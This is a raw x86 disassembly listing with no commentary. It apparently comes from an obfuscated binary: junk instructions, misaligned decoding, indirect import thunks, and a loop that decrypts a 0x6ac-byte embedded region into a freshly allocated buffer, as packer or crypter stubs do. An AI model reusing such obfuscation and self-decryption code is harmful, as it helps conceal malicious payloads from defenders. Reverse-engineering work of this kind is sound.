  4d108e:	lea    edi,[edi-0x1d4]
  4d1094:	push   edi
  4d1095:	call   0x4d13d4
  4d109a:	add    esp,0x4
  4d109d:	test   eax,eax
  4d109f:	jne    0x4d108e
  4d10a1:	pop    edi
  4d10a2:	add    esp,0x34
  4d10a5:	pop    ebp
  4d10a6:	ret    
  4d10a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10ad:	sub    esp,0x58
  4d10b0:	lea    eax,[ecx-0xbc]
  4d10b6:	add    DWORD PTR [eax+0xd4],0xb46
  4d10c0:	push   eax
  4d10c1:	push   DWORD PTR [eax+0xf0]
  4d10c7:	push   esi
  4d10c8:	push   DWORD PTR [eax+0x30]
  4d10cb:	push   edi
  4d10cc:	call   0x4d0fbc
  4d10d1:	add    esp,0x10
  4d10d4:	pop    eax
  4d10d5:	push   eax
  4d10d6:	push   0x0
  4d10d8:	call   0x4d10f0
  4d10dd:	add    esp,0x4
  4d10e0:	pop    eax
  4d10e1:	push   eax
  4d10e2:	call   0x4d15ec
  4d10e7:	add    esp,0x4
  4d10ea:	pop    eax
  4d10eb:	add    esp,0x58
  4d10ee:	pop    ebp
  4d10ef:	ret    
  4d10f0:	pop    edi
  4d10f1:	call   DWORD PTR ds:0x4d2048
  4d10f7:	call   edi
  4d10f9:	add    BYTE PTR [eax],al
  4d10fb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1101:	sub    esp,0x30
  4d1104:	cmp    ebx,0xb47
  4d110a:	jbe    0x4d10ff
  4d110c:	lea    esi,[ebx+0x40]
  4d110f:	mov    edx,0x6ac
  4d1114:	push   edx
  4d1115:	push   0x6ac
  4d111a:	push   0x40001
  4d111f:	mov    edi,0x862985ae
  4d1124:	push   DWORD PTR [edi+0x7a239a86]
  4d112a:	sub    DWORD PTR [esp],0x2
  4d112e:	mov    edi,0x4d200c
  4d1133:	pop    DWORD PTR [edi]
  4d1135:	call   0x4d0874
  4d113a:	add    esp,0x4
  4d113d:	push   eax
  4d113e:	pop    DWORD PTR [esi+0x148]
  4d1144:	mov    edi,DWORD PTR [esi+0x148]
  4d114a:	lea    edx,[edi]
  4d114c:	sub    eax,eax
  4d114e:	dec    eax
  4d114f:	and    eax,0x4d0014
  4d1154:	mov    ebx,0x7ec7f445
  4d1159:	xor    ecx,ecx
  4d115b:	cmp    ecx,0x6ac
  4d1161:	je     0x4d117f
  4d1163:	sub    ecx,0xfffffffc
  4d1166:	xor    edi,edi
  4d1168:	push   DWORD PTR [eax+edi*1]
  4d116b:	add    DWORD PTR [esp],ebx
  4d116e:	pop    DWORD PTR [edx+edi*2]
  4d1171:	dec    DWORD PTR [edx]
  4d1173:	xor    ebx,ebx
  4d1175:	add    ebx,DWORD PTR [eax]
  4d1177:	add    eax,0x4
  4d117a:	add    edx,0x4
  4d117d:	jmp    0x4d115b
  4d117f:	mov    edx,0x0
  4d1184:	push   edx
  4d1185:	call   0x4d1434
  4d118a:	add    esp,0x4
  4d118d:	add    esp,0x30
  4d1190:	pop    ebp
  4d1191:	ret    
  4d1192:	add    BYTE PTR [eax],al
  4d1194:	pop    edi
  4d1195:	call   DWORD PTR ds:0x4d206c
  4d119b:	call   edi
  4d119d:	add    BYTE PTR [eax],al
  4d119f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11a5:	sub    esp,0x34
  4d11a8:	lea    eax,ds:0x4d3014
  4d11ae:	add    DWORD PTR [ebp-0x24],eax
  4d11b1:	push   eax
  4d11b2:	mov    ecx,0x0
  4d11b7:	push   ecx
  4d11b8:	call   0x4d15d4
  4d11bd:	add    esp,0x4
  4d11c0:	pop    eax
  4d11c1:	push   eax
  4d11c2:	push   esi
  4d11c3:	push   DWORD PTR [eax+0x1a0]
  4d11c9:	push   DWORD PTR [eax+0xfc]
  4d11cf:	push   edx
  4d11d0:	call   0x4d1000
  4d11d5:	add    esp,0x10
  4d11d8:	pop    eax
  4d11d9:	push   eax
  4d11da:	push   0x0
  4d11dc:	call   0x4d14e8
  4d11e1:	add    esp,0x4
  4d11e4:	pop    eax
  4d11e5:	add    esp,0x34
  4d11e8:	pop    ebp
  4d11e9:	ret    
  4d11ea:	add    BYTE PTR [eax],al
  4d11ec:	mov    edi,edi
  4d11ee:	push   ebp
  4d11ef:	mov    ebp,esp
  4d11f1:	sub    esp,0x2c
  4d11f4:	lea    edi,ds:0x4d310c
  4d11fa:	adc    ecx,0x6b
  4d11fd:	push   edi
  4d11fe:	mov    esi,0x0
  4d1203:	push   esi
  4d1204:	call   0x4d14e8
  4d1209:	add    esp,0x4
  4d120c:	pop    edi
  4d120d:	push   edi
  4d120e:	push   edx
  4d120f:	push   DWORD PTR [edi+0x1c4]
  4d1215:	push   DWORD PTR [edi+0x198]
  4d121b:	push   ebx
  4d121c:	call   0x4d08e4
  4d1221:	add    esp,0x10
  4d1224:	pop    edi
  4d1225:	push   edi
  4d1226:	mov    ebx,0x0
  4d122b:	push   ebx
  4d122c:	call   0x4d0798
  4d1231:	add    esp,0x4
  4d1234:	pop    edi
  4d1235:	add    esp,0x2c
  4d1238:	pop    ebp
  4d1239:	ret    
  4d123a:	add    BYTE PTR [eax],al
  4d123c:	mov    edi,edi
  4d123e:	push   ebp
  4d123f:	mov    ebp,esp
  4d1241:	sub    esp,0x34
  4d1244:	mov    ecx,0x4d31c4
  4d1249:	xor    DWORD PTR [ecx+0xc],eax
  4d124c:	push   ecx
  4d124d:	push   edi
  4d124e:	push   DWORD PTR [ecx+0x78]
  4d1251:	push   DWORD PTR [ecx+0xac]
  4d1257:	push   edx
  4d1258:	call   0x4d11ec
  4d125d:	add    esp,0x10
  4d1260:	pop    ecx
  4d1261:	push   ecx
  4d1262:	push   0x0
  4d1264:	call   0x4d13f8
  4d1269:	add    esp,0x4
  4d126c:	pop    ecx
  4d126d:	push   ecx
  4d126e:	push   0x0
  4d1270:	call   0x4d14e8
  4d1275:	add    esp,0x4
  4d1278:	pop    ecx
  4d1279:	add    esp,0x34
  4d127c:	pop    ebp
  4d127d:	ret    
  4d127e:	add    BYTE PTR [eax],al
  4d1280:	mov    edi,edi
  4d1282:	push   ebp
  4d1283:	mov    ebp,esp
  4d1285:	sub    esp,0x28
  4d1288:	lea    ebx,[edi+0xfc]
  4d128e:	cmp    ebx,0xf01
  4d1294:	jbe    0x4d1283
  4d1296:	mov    eax,0x0
  4d129b:	push   eax
  4d129c:	call   0x4d1434
  4d12a1:	add    esp,0x4
  4d12a4:	push   ebx
  4d12a5:	push   esi
  4d12a6:	push   DWORD PTR [ebx+0x1c8]
  4d12ac:	push   DWORD PTR [ebx+0x104]
  4d12b2:	push   DWORD PTR [ebx+0x110]
  4d12b8:	call   0x4d0cac
  4d12bd:	add    esp,0x10
  4d12c0:	pop    ebx
  4d12c1:	mov    ecx,0x0
  4d12c6:	push   ecx
  4d12c7:	call   0x4d10f0
  4d12cc:	add    esp,0x4
  4d12cf:	add    esp,0x28
  4d12d2:	pop    ebp
  4d12d3:	ret    
  4d12d4:	mov    edi,edi
  4d12d6:	push   ebp
  4d12d7:	mov    ebp,esp
  4d12d9:	sub    esp,0x2c
  4d12dc:	mov    eax,0x4d31ac
  4d12e1:	or     DWORD PTR [eax-0x13c],esi
  4d12e7:	push   eax
  4d12e8:	push   DWORD PTR [eax+0xe0]
  4d12ee:	push   DWORD PTR [eax+0x170]
  4d12f4:	push   esi
  4d12f5:	push   esi
  4d12f6:	call   0x4d088c
  4d12fb:	add    esp,0x10
  4d12fe:	pop    eax
  4d12ff:	push   eax
  4d1300:	mov    esi,0xfffffff4
  4d1305:	push   esi
  4d1306:	call   0x4d1410
  4d130b:	add    esp,0x4
  4d130e:	pop    eax
  4d130f:	push   eax
  4d1310:	lea    edi,[eax-0x1ac]
  4d1316:	push   edi
  4d1317:	call   0x4d13d4
  4d131c:	add    esp,0x4
  4d131f:	test   eax,eax
  4d1321:	jne    0x4d1310
  4d1323:	pop    eax
  4d1324:	add    esp,0x2c
  4d1327:	pop    ebp
  4d1328:	ret    
  4d1329:	add    BYTE PTR [eax],al
  4d132b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1331:	sub    esp,0x5c
  4d1334:	mov    edi,0x4d3010
  4d1339:	add    esi,ecx
  4d133b:	push   edi
  4d133c:	push   DWORD PTR [edi+0x1ec]
  4d1342:	push   DWORD PTR [edi+0x18]
  4d1345:	push   DWORD PTR [edi+0x188]
  4d134b:	call   0x4d0cf0
  4d1350:	add    esp,0xc
  4d1353:	pop    edi
  4d1354:	push   edi
  4d1355:	push   0x0
  4d1357:	call   0x4d0f18
  4d135c:	add    esp,0x4
  4d135f:	pop    edi
  4d1360:	push   edi
  4d1361:	push   0x0
  4d1363:	call   0x4d0f18
  4d1368:	add    esp,0x4
  4d136b:	pop    edi
  4d136c:	add    esp,0x5c
  4d136f:	pop    ebp
  4d1370:	ret    
  4d1371:	add    BYTE PTR [eax],al
  4d1373:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1379:	sub    esp,0x54
  4d137c:	mov    edi,0x4d3064
  4d1381:	sub    DWORD PTR [ebp-0x24],edi
  4d1384:	push   edi
  4d1385:	push   0x0
  4d1387:	call   0x4d0798
  4d138c:	add    esp,0x4
  4d138f:	pop    edi
  4d1390:	push   edi
  4d1391:	push   DWORD PTR [edi+0xf0]
  4d1397:	push   ebx
  4d1398:	push   DWORD PTR [edi+0x1b4]
  4d139e:	call   0x4d07e0
  4d13a3:	add    esp,0xc
  4d13a6:	pop    edi
  4d13a7:	push   edi
  4d13a8:	mov    ecx,0x0
  4d13ad:	push   ecx
  4d13ae:	call   0x4d14f4
  4d13b3:	add    esp,0x4
  4d13b6:	pop    edi
  4d13b7:	add    esp,0x54
  4d13ba:	pop    ebp
  4d13bb:	ret    
  4d13bc:	pop    edi
  4d13bd:	call   DWORD PTR ds:0x4d203c
  4d13c3:	call   edi
  4d13c5:	add    BYTE PTR [eax],al
  4d13c7:	add    BYTE PTR [edi-0x1],bl
  4d13ca:	adc    eax,0x4d208c
  4d13cf:	call   edi
  4d13d1:	add    BYTE PTR [eax],al
  4d13d3:	add    BYTE PTR [edi-0x1],bl
  4d13d6:	adc    eax,0x4d204c
  4d13db:	call   edi
  4d13dd:	add    BYTE PTR [eax],al
  4d13df:	add    BYTE PTR [edi-0x1],bl
  4d13e2:	adc    eax,0x4d2030
  4d13e7:	call   edi
  4d13e9:	add    BYTE PTR [eax],al
  4d13eb:	add    BYTE PTR [edi-0x1],bl
  4d13ee:	adc    eax,0x4d202c
  4d13f3:	call   edi
  4d13f5:	add    BYTE PTR [eax],al
  4d13f7:	add    BYTE PTR [edi-0x1],bl
  4d13fa:	adc    eax,0x4d205c
  4d13ff:	call   edi
  4d1401:	add    BYTE PTR [eax],al
  4d1403:	add    BYTE PTR [edi-0x1],bl
  4d1406:	adc    eax,0x4d2034
  4d140b:	call   edi
  4d140d:	add    BYTE PTR [eax],al
  4d140f:	add    BYTE PTR [edi-0x1],bl
  4d1412:	adc    eax,0x4d201c
  4d1417:	call   edi
  4d1419:	add    BYTE PTR [eax],al
  4d141b:	add    BYTE PTR [edi-0x1],bl
  4d141e:	adc    eax,0x4d2084
  4d1423:	call   edi
  4d1425:	add    BYTE PTR [eax],al
  4d1427:	add    BYTE PTR [edi-0x1],bl
  4d142a:	adc    eax,0x4d2070
  4d142f:	call   edi
  4d1431:	add    BYTE PTR [eax],al
  4d1433:	add    BYTE PTR [edi-0x1],bl
  4d1436:	adc    eax,0x4d2038
  4d143b:	call   edi
  4d143d:	add    BYTE PTR [eax],al
  4d143f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1445:	sub    esp,0x38
  4d1448:	lea    ecx,ds:0x4d30ac
  4d144e:	or     DWORD PTR [ecx+0x140],eax
  4d1454:	push   ecx
  4d1455:	push   edi
  4d1456:	push   DWORD PTR [ecx+0x114]
  4d145c:	push   DWORD PTR [ecx+0x1d4]
  4d1462:	push   DWORD PTR [ecx+0x128]
  4d1468:	call   0x4d132c
  4d146d:	add    esp,0x10
  4d1470:	pop    ecx
  4d1471:	push   ecx
  4d1472:	lea    edx,[ecx-0xac]
  4d1478:	push   edx
  4d1479:	call   0x4d13d4
  4d147e:	add    esp,0x4
  4d1481:	test   eax,eax
  4d1483:	jne    0x4d1472
  4d1485:	pop    ecx
  4d1486:	push   ecx
  4d1487:	mov    ecx,0x0
  4d148c:	push   ecx
  4d148d:	call   0x4d13f8
  4d1492:	add    esp,0x4
  4d1495:	pop    ecx
  4d1496:	add    esp,0x38
  4d1499:	pop    ebp
  4d149a:	ret    
  4d149b:	add    BYTE PTR [edi-0x1],bl
  4d149e:	adc    eax,0x4d2068
  4d14a3:	call   edi
  4d14a5:	add    BYTE PTR [eax],al
  4d14a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14ad:	sub    esp,0x50
  4d14b0:	mov    edi,0x4d3010
  4d14b5:	xor    eax,DWORD PTR [ebp-0x24]
  4d14b8:	push   edi
  4d14b9:	push   eax
  4d14ba:	push   DWORD PTR [edi+0x1e0]
  4d14c0:	call   0x4d1280
  4d14c5:	add    esp,0x8
  4d14c8:	pop    edi
  4d14c9:	push   edi
  4d14ca:	push   0x0
  4d14cc:	call   0x4d0f18
  4d14d1:	add    esp,0x4
  4d14d4:	pop    edi
  4d14d5:	push   edi
  4d14d6:	push   0x0
  4d14d8:	call   0x4d1434
  4d14dd:	add    esp,0x4
  4d14e0:	pop    edi
  4d14e1:	add    esp,0x50
  4d14e4:	pop    ebp
  4d14e5:	ret    
  4d14e6:	add    BYTE PTR [eax],al
  4d14e8:	pop    edi
  4d14e9:	call   DWORD PTR ds:0x4d2008
  4d14ef:	call   edi
  4d14f1:	add    BYTE PTR [eax],al
  4d14f3:	add    BYTE PTR [edi-0x1],bl
  4d14f6:	adc    eax,0x4d2054
  4d14fb:	call   edi
  4d14fd:	add    BYTE PTR [eax],al
  4d14ff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1505:	sub    esp,0x24
  4d1508:	mov    edi,0x4d30f4
  4d150d:	sub    esi,DWORD PTR [edi+0x64]
  4d1510:	push   edi
  4d1511:	push   edx
  4d1512:	push   edx
  4d1513:	push   DWORD PTR [edi+0xd8]
  4d1519:	push   ebx
  4d151a:	call   0x4d0aa4
  4d151f:	add    esp,0x10
  4d1522:	pop    edi
  4d1523:	push   edi
  4d1524:	push   0x0
  4d1526:	call   0x4d14e8
  4d152b:	add    esp,0x4
  4d152e:	pop    edi
  4d152f:	push   edi
  4d1530:	push   0x0
  4d1532:	call   0x4d0e10
  4d1537:	add    esp,0x4
  4d153a:	pop    edi
  4d153b:	add    esp,0x24
  4d153e:	pop    ebp
  4d153f:	ret    
  4d1540:	mov    edi,edi
  4d1542:	push   ebp
  4d1543:	mov    ebp,esp
  4d1545:	sub    esp,0x20
  4d1548:	lea    esi,ds:0x4d30f0
  4d154e:	sbb    DWORD PTR [ebp-0x1c],ebx
  4d1551:	push   esi
  4d1552:	push   DWORD PTR [esi+0x1ac]
  4d1558:	push   edx
  4d1559:	push   eax
  4d155a:	push   ebx
  4d155b:	call   0x4d123c
  4d1560:	add    esp,0x10
  4d1563:	pop    esi
  4d1564:	mov    ebx,0x0
  4d1569:	push   ebx
  4d156a:	call   0x4d10f0
  4d156f:	add    esp,0x4
  4d1572:	push   0x0
  4d1574:	call   0x4d14e8
  4d1579:	add    esp,0x4
  4d157c:	add    esp,0x20
  4d157f:	pop    ebp
  4d1580:	ret    
  4d1581:	add    BYTE PTR [eax],al
  4d1583:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1589:	sub    esp,0x20
  4d158c:	lea    eax,[esi-0x198]
  4d1592:	add    esi,edi
  4d1594:	push   eax
  4d1595:	mov    ecx,0x0
  4d159a:	push   ecx
  4d159b:	call   0x4d0e10
  4d15a0:	add    esp,0x4
  4d15a3:	pop    eax
  4d15a4:	push   eax
  4d15a5:	push   DWORD PTR [eax+0xe4]
  4d15ab:	push   DWORD PTR [eax+0x108]
  4d15b1:	push   ecx
  4d15b2:	push   edi
  4d15b3:	call   0x4d1540
  4d15b8:	add    esp,0x10
  4d15bb:	pop    eax
  4d15bc:	push   eax
  4d15bd:	mov    esi,0x0
  4d15c2:	push   esi
  4d15c3:	call   0x4d0880
  4d15c8:	add    esp,0x4
  4d15cb:	pop    eax
  4d15cc:	add    esp,0x20
  4d15cf:	pop    ebp
  4d15d0:	ret    
  4d15d1:	add    BYTE PTR [eax],al
  4d15d3:	add    BYTE PTR [edi-0x1],bl
  4d15d6:	adc    eax,0x4d2080
  4d15db:	call   edi
  4d15dd:	add    BYTE PTR [eax],al
  4d15df:	add    BYTE PTR [edi-0x1],bl
  4d15e2:	adc    eax,0x4d207c
  4d15e7:	call   edi
  4d15e9:	add    BYTE PTR [eax],al
  4d15eb:	add    BYTE PTR [edi-0x1],bl
  4d15ee:	adc    eax,0x4d2014
  4d15f3:	call   edi
  4d15f5:	add    BYTE PTR [eax],al
  4d15f7:	add    BYTE PTR [edi-0x1],bl
  4d15fa:	adc    eax,0x4d2090
  4d15ff:	call   edi
  4d1601:	add    BYTE PTR [eax],al
	...
